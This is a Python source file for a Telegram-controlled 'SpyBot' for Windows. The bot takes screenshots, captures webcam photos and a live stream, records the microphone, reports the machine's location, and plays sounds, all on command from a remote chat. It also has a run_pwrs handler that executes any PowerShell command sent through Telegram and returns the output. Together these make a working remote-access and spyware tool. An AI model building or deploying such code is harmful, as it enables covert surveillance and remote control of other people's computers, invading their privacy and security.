import subprocess
import pyautogui
import geocoder
import winsound
import sounddevice as sd
import soundfile as sf
from scipy.io.wavfile import write
import cv2 
import os
import asyncio
import nest_asyncio
import ctypes
import socket
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
from flask import Flask, Response
from threading import Thread
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL

# Use the new token from BotFather
TOKEN = "REPLACE WITH TELEGRAM BOT KEY"

# Keyboard layout
keyboard = [["/start", "/help"], ["/capture_screen", "/capture_front_cam"], ["/capture_audio", "/audio_time"],["/get_location", "/beep", "/beep_time"], ["/start_stream", "/stop_stream"], ["run_pwrs"], ["/stop_audio"], ["/volume_setting"]]
reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

nest_asyncio.apply()

# Audio duration
audio_duration = 5
#Beep duration
beep_duration = 1000
#Beep frequency
beep_freq = 1000

def get_local_ip():
    try:
        # Create a dummy socket to an external address
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Google's DNS server
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        print(f"Error getting local IP: {e}")
        return None
    
# Flask app for live streaming
flask_app = Flask(__name__)

# Access the front camera (0 or 1 depending on your device)
camera = cv2.VideoCapture(0)
# Generate frames from the camera
def generate_frames():
    camera = cv2.VideoCapture(0)  # Reinitialize the camera every time
    while True:
        success, frame = camera.read()
        if not success:
            break
        else:
            _, buffer = cv2.imencode('.jpg', frame)
            frame = buffer.tobytes()

            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
    camera.release()

@flask_app.route('/video')
def video_feed():
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "Hello! Welcome to SpyBot.",
        reply_markup=reply_markup
    )

# Help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "Here’s what I can do:\n/start - Start the bot\n/help - Get help\n/capture - Capture a screenshot",
        reply_markup=reply_markup
    )

# Capture a single screenshot only when button is clicked
async def capture_screen(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        screenshot_path = "C:/Users/karth/projects/python-projects/spBot/screenshot.png"

        # Take screenshot and save it
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)

        # Send the screenshot
        with open(screenshot_path, "rb") as image:
            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=image)

        # Delete the screenshot after sending
        os.remove(screenshot_path)
    except Exception as e:
        await update.message.reply_text(f"Error capturing screenshot: {str(e)}")

async def capture_front_cam(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        captured_image_path = "C:/Users/karth/projects/python-projects/spBot/captured_image.jpg"
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await update.message.reply_text("Error opening camera")
            return
        
        # Capture a single frame
        ret, frame = cap.read()

        if ret:
            cv2.imwrite(captured_image_path, frame)
            with open(captured_image_path, "rb") as image:
                await context.bot.send_photo(chat_id=update.effective_chat.id, photo=image)
            os.remove(captured_image_path)
        else:
            await update.message.reply_text("Error capturing image")
    except Exception as e:
        await update.message.reply_text(f"Error capturing image: {str(e)}")
    finally:
        cap.release()

async def capture_audio(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        fs = 44100 # Sample rate  
        captured_audio_path = "C:/Users/karth/projects/python-projects/spBot/captured_audio.wav"
        audio = sd.rec(int(audio_duration * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait()  # Wait until recording is finished
        write(captured_audio_path, fs, audio)  # Save as WAV file
        with open(captured_audio_path, "rb") as audio:
            await context.bot.send_audio(chat_id=update.effective_chat.id, audio=audio)
        os.remove(captured_audio_path)
    except Exception as e:
        await update.message.reply_text(f"Error capturing audio: {str(e)}")

async def audio_time(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        # Extract the duration from the command argument
        duration = int(context.args[0])
        global audio_duration
        audio_duration = duration
        await update.message.reply_text(f"Audio duration set to {duration} seconds.")
    except (IndexError, ValueError):
        await update.message.reply_text("Invalid input. Please enter a number after the command.")

async def beep(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        winsound.Beep(beep_freq, beep_duration)
    except Exception as e: 
        await update.message.reply_text(f"Error beeping: {str(e)}")

async def beep_time(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        # Extract the duration from the command argument
        duration = int(context.args[0])
        global beep_duration
        beep_duration = duration
        await update.message.reply_text(f"Beep duration set to {duration} milliseconds.")
    except (IndexError, ValueError):
        await update.message.reply_text("Invalid input. Please enter a number after the command.")

async def get_location(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        g = geocoder.ip("me")
        if g.ok:
            lat, lng = g.latlng
            map_url = f"https://www.google.com/maps?q={lat},{lng}"
            await update.message.reply_text(f"Latitude: {lat}\nLongitude: {lng}\n[View on Map]({map_url})", parse_mode="Markdown")
        else:
            await update.message.reply_text("Error getting location.")
    except Exception as e:
        await update.message.reply_text(f"Error getting location: {str(e)}")
    
async def run_pwrs(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        if not context.args:
            await update.message.reply_text("Please provide a PowerShell command to run.")
            return
        
        command = " ".join(context.args)  # Join args in case there are spaces
        process = subprocess.run(
            f"powershell.exe -Command \"{command}\"", 
            shell=True, 
            capture_output=True, 
            text=True
        )

        output = process.stdout.strip()
        errors = process.stderr.strip()

        # Respond with a cleaner format
        response = ""
        if output:
            response += f"Output:\n{output}\n"
        if errors:
            response += f"Errors:\n{errors}\n"
        if not response:
            response = "No output or errors."

        await update.message.reply_text(response)

    except Exception as e:
        await update.message.reply_text(f"Error running command: {str(e)}")


# Track if audio is playing
audio_playing = False

# Function to handle audio messages
async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global audio_playing
    if audio_playing:
        await update.message.reply_text("Audio is already playing. Stop it first before playing another.")
        return

    audio_file = update.message.audio or update.message.voice
    if audio_file:
        file = await context.bot.get_file(audio_file.file_id)
        file_path = f"C:/Users/karth/projects/python-projects/spBot/{audio_file.file_id}.ogg"
        await file.download_to_drive(file_path)
        await update.message.reply_text("Audio received! Playing it now...")

        try:
            data, samplerate = sf.read(file_path)
            audio_playing = True
            sd.play(data, samplerate)
            sd.wait()
        except Exception as e:
            await update.message.reply_text(f"Failed to play audio: {e}")
        finally:
            audio_playing = False
            os.remove(file_path)

# Function to stop playing audio
async def stop_audio(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global audio_playing
    try:
        if audio_playing:
            sd.stop()
            audio_playing = False
            await update.message.reply_text("Audio playback stopped.")
        else:
            await update.message.reply_text("No audio is currently playing.")
    except Exception as e:
        await update.message.reply_text(f"Failed to stop audio: {e}")

# Function to show volume control buttons
async def volume_setting(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [[InlineKeyboardButton("Volume Up", callback_data='volume_up')],
                [InlineKeyboardButton("Volume Down", callback_data='volume_down')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Get the current volume
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    current_volume = volume.GetMasterVolumeLevelScalar()

    await update.message.reply_text(f"Current volume: {current_volume * 100:.0f}%", reply_markup=reply_markup)

# Function to handle volume control
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    current_volume = volume.GetMasterVolumeLevelScalar()

    if query.data == 'volume_up':
        new_volume = min(current_volume + 0.1, 1.0)
        volume.SetMasterVolumeLevelScalar(new_volume, None)
        await query.edit_message_text(f"Volume increased to: {new_volume * 100:.0f}%")
    elif query.data == 'volume_down':
        new_volume = max(current_volume - 0.1, 0.0)
        volume.SetMasterVolumeLevelScalar(new_volume, None)
        await query.edit_message_text(f"Volume decreased to: {new_volume * 100:.0f}%")

# Start streaming command

async def start_stream(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ip = get_local_ip()
    await update.message.reply_text(f"Streaming started. Access it at http://{ip}:5000/video")

async def stop_stream(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Streaming stopped.")

# Main function
async def main():
    app = Application.builder().token(TOKEN).build()

    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("capture_screen", capture_screen))
    app.add_handler(CommandHandler("capture_front_cam", capture_front_cam))
    app.add_handler(CommandHandler("capture_audio", capture_audio))
    app.add_handler(CommandHandler("audio_time", audio_time))
    app.add_handler(CommandHandler("get_location", get_location))
    app.add_handler(CommandHandler("beep", beep))
    app.add_handler(CommandHandler("beep_time", beep_time))
    app.add_handler(CommandHandler("start_stream", start_stream))
    app.add_handler(CommandHandler("stop_stream", stop_stream))
    app.add_handler(CommandHandler("run_pwrs", run_pwrs))
    app.add_handler(CommandHandler("stop_audio", stop_audio))
    app.add_handler(CommandHandler("volume_setting", volume_setting))

    # Audio message handler
    app.add_handler(MessageHandler(filters.AUDIO | filters.VOICE, handle_audio))

    # Callback query handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, button_callback))

    # Start the bot
    await app.run_polling()
if __name__ == "__main__":
    # Run Flask app in a separate thread
    flask_thread = Thread(target=lambda: flask_app.run(host='0.0.0.0', port=5000, debug=False))
    flask_thread.start()

    # Run the Telegram bot
    asyncio.run(main())